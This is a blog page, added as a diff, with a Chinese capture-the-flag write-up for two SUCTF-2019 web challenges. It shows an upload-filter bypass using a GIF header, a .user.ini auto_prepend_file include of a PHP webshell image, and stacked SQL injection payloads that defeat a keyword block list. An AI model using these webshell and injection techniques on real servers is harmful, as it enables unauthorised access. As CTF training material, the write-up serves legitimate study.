@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="对未来的最大慷慨，就是把一切都献给现在。">
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        SUCTF-2019 - undefined
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i>  </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/" />
+        </div>
+        <div class="name">
+            <i>Luc1fer</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>主页</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>标签</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>存档</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>关于</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SUCTF-2019-WP"><span class="toc-text">SUCTF-2019 WP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checkin"><span class="toc-text">checkin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#user-ini-文件构成的后门"><span class="toc-text">.user.ini 文件构成的后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#开始上传"><span class="toc-text">开始上传</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-sql"><span class="toc-text">easy sql</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#logical-OR"><span class="toc-text">|| logical OR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#如何做？"><span class="toc-text">如何做？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#非预期"><span class="toc-text">非预期</span></a></li></ol></li></ol></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">搜索</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i>  </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        SUCTF-2019
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">发布于：<span>2019-09-10 18:15:38</span></span>
+        
+        <span class="attr">标签：/
+        
+        <a class="tag" href="/tags/#php" title="php">php</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <h1 id="SUCTF-2019-WP"><a href="#SUCTF-2019-WP" class="headerlink" title="SUCTF-2019 WP"></a>SUCTF-2019 WP</h1><p>9/10/2019 6:15:38 PM </p>
+<h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>先上传一个 <code>websell.php</code>，显示后缀不合法(改<code>php5</code>、<code>php4</code>、<code>content-type</code>这些都不行)。</p>
+<p>再上传一个图片马发现显示 <code>&amp;lt;? in contents!</code> ，就是说<code>&lt; ?</code>不能连续存在。</p>
+<p>我们通过<code>&lt;script language=&#39;php&#39;&gt;&lt;/script&gt;</code>来绕过对<code>&lt;?</code>的检测。这次我们得到回显<br>    exif_imagetype:not image!</p>
+<p><code>exif_imagetype</code>用来判断图片类型，他读取一个图像的第一个字节并检查其签名。只要我们添加一个图片头就可以绕过，比如添加<code>GIF89a</code>.在添加完之后我们上传成功，此时的文件目录下除了我们上传的<code>webshell</code>还有一个<code>index.php</code>.</p>
+<h3 id="user-ini-文件构成的后门"><a href="#user-ini-文件构成的后门" class="headerlink" title=".user.ini 文件构成的后门"></a>.user.ini 文件构成的后门</h3><p>详情看p神这篇文章<a href="http://www.vuln.cn/6001" title="点这里" target="_blank" rel="noopener">http://www.vuln.cn/6001</a></p>
+<blockquote>
+<p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>
+</blockquote>
+<blockquote>
+<p>在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p>
+</blockquote>
+<p><code>.user.ini</code>类似一个用户自定义的<code>php.ini</code>。我们能够自定义的设置是”<code>PHP_INI_PERDIR</code> 、 <code>PHP_INI_USER</code>“的设置。（上面表格中没有提到的<code>PHP_INI_PERDIR</code>也可以在<code>.user.ini</code>中设置）</p>
+<p>实际上，除了<code>PHP_INI_SYSTEM</code>以外的模式（包括<code>PHP_INI_ALL</code>）都是可以通过<code>.user.ini</code>来设置的。</p>
+<p>和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p>
+<p><img src="https://images2015.cnblogs.com/blog/804631/201602/804631-20160212221854714-1902413142.png" alt="php中两个配置"></p>
+<p><code>auto_prepend_file</code> 意味这是在php脚本执行前会执行这个参数设置的脚本，类似于在文件前调用<code>require()</code>然后这个参数的脚本所在目录受<code>include_path</code>限制<br><code>append</code>是在<code>php</code>脚本执行后才执行的，但是要注意的是遇到<code>exit()</code>的时候，这个脚本也不能运行</p>
+<p>使用的时候直接写在<code>.user.ini</code>中</p>
+<pre><code>auto_prepend_file=webshell.gif</code></pre><p>webshell.gif是要包含的文件.所以我们可以借助这个配置项来让所有的php文件都“自动”包含这个文件。👍</p>
+<p>某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。</p>
+<p>.htaccess文件构成的后门看这里：<a href="https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet" title=".htaccess">https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet</a>这个只能用于Apache</p>
+<p>看到这里我们发现当前目录下确实有<code>index.php</code>可以利用，于是我们开始吧🎈</p>
+<h3 id="开始上传"><a href="#开始上传" class="headerlink" title="开始上传"></a>开始上传</h3><p>我们先构造<code>.user.ini</code>文件</p>
+<pre><code>GIF89a
+auto_prepend_file=CK.jpg</code></pre><p>然后将其上传</p>
+<p>接着构造图片马<code>CK.jpg</code></p>
+<pre><code>GIF89a
+&lt;script language=&apos;php&apos;&gt;
+    system(&apos;cat /flag&apos;);
+&lt;/script&gt;</code></pre><p>成功上传之后我们访问上传后的页面即可看到flag。</p>
+<h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy sql"></a>easy sql</h2><p>存在堆叠注入，测试<code>1;show tables;</code>回显</p>
+<pre><code>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag ) </code></pre><p>测试<code>1;select * from Flag;</code>,flag被过滤了</p>
+<p><code>.index.php.swp</code>存在源码泄露,源码如下  </p>
+<pre><code>&lt;?php
+    session_start();
+
+    include_once &quot;config.php&quot;;
+
+    $post = array();
+    $get = array();
+    global $MysqlLink;
+
+    //GetPara();
+    $MysqlLink = mysqli_connect(&quot;localhost&quot;,$datauser,$datapass);
+    if(!$MysqlLink){
+        die(&quot;Mysql Connect Error!&quot;);
+    }
+    $selectDB = mysqli_select_db($MysqlLink,$dataName);
+    if(!$selectDB){
+        die(&quot;Choose Database Error!&quot;);
+    }
+
+    foreach ($_POST as $k=&gt;$v){
+        if(!empty($v)&amp;&amp;is_string($v)){
+            $post[$k] = trim(addslashes($v));
+        }
+    }
+    foreach ($_GET as $k=&gt;$v){
+        }
+    }
+    //die();
+    ?&gt;
+
+&lt;html&gt;
+&lt;head&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/ a&gt;
+&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;
+&lt;input type=&quot;text&quot; name=&quot;query&quot;&gt;
+&lt;input type=&quot;submit&quot;&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+&lt;?php
+
+    if(isset($post[&apos;query&apos;])){
+        $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;;
+        //var_dump(preg_match(&quot;/{$BlackList}/is&quot;,$post[&apos;query&apos;]));
+        if(preg_match(&quot;/{$BlackList}/is&quot;,$post[&apos;query&apos;])){
+            //echo $post[&apos;query&apos;];
+            die(&quot;Nonono.&quot;);
+        }
+        if(strlen($post[&apos;query&apos;])&gt;40){
+            die(&quot;Too long.&quot;);
+        }
+        $sql = &quot;select &quot;.$post[&apos;query&apos;].&quot;||flag from Flag&quot;;
+        mysqli_multi_query($MysqlLink,$sql);
+        do{
+            if($res = mysqli_store_result($MysqlLink)){
+                while($row = mysqli_fetch_row($res)){
+                    print_r($row);
+                }
+            }
+        }while(@mysqli_next_result($MysqlLink));
+
+    }
+
+    ?&gt;</code></pre><p>查询语句为：<code>$sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;</code></p>
+<h3 id="logical-OR"><a href="#logical-OR" class="headerlink" title="|| logical OR"></a>|| logical OR</h3><pre><code>mysql&gt; SELECT 1 OR 1;
+        -&gt; 1
+mysql&gt; SELECT 1 OR 0;
+        -&gt; 1
+mysql&gt; SELECT 0 OR 0;
+        -&gt; 0
+mysql&gt; SELECT 0 OR NULL;
+        -&gt; NULL
+mysql&gt; SELECT 1 OR NULL;
+        -&gt; 1</code></pre><blockquote>
+<p>Logical OR. When both operands are non-NULL, the result is 1 if any operand is nonzero, and 0 otherwise. With a NULL operand, the result is 1 if the other operand is nonzero, and NULL otherwise. If both operands are NULL, the result is NULL. </p>
+</blockquote>
+<h3 id="如何做？"><a href="#如何做？" class="headerlink" title="如何做？"></a>如何做？</h3><p>先来看一个msql的配置</p>
+<p><strong>PIPES_AS_CONCAT</strong></p>
+<blockquote>
+<p>Treat || as a string concatenation operator (same as CONCAT()) rather than as a synonym for OR. </p>
+</blockquote>
+<p>如果配置了<code>sql_mode=PIPES_AS_CONCAT</code>，Mysql会把逻辑或当作一个字符串链接函数对待。  </p>
+<p><strong>CONCAT(str1,str2,…)</strong></p>
+<blockquote>
+<p>Returns the string that results from concatenating the arguments. May have one or more arguments. If all arguments are nonbinary strings, the result is a nonbinary string. If the arguments include any binary strings, the result is a binary string. A numeric argument is converted to its equivalent nonbinary string form. </p>
+</blockquote>
+<p><code>CONCAT()</code> returns NULL if any argument is NULL. </p>
+<pre><code>mysql&gt; SELECT CONCAT(&apos;My&apos;, &apos;S&apos;, &apos;QL&apos;);
+        -&gt; &apos;MySQL&apos;
+mysql&gt; SELECT CONCAT(&apos;My&apos;, NULL, &apos;QL&apos;);
+        -&gt; NULL
+mysql&gt; SELECT CONCAT(14.3);
+        -&gt; &apos;14.3&apos;</code></pre><p>我们通过<code>sql_mode=PIPES_AS_CONCAT</code>来将flag带出来</p>
+<p>payload:  <code>1;sql_mode=PIPES_AS_CONCAT;select 1;</code>  </p>
+<p>语句为:</p>
+<pre><code>select 1;sql_mode=PIPES_AS_CONCAT;select 1;|| flag rom Flag;</code></pre><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>payload:<code>*,1</code>构造<code>select *,1 || flag from Flag;</code> 即可查出全部内容。</p>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = ""
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
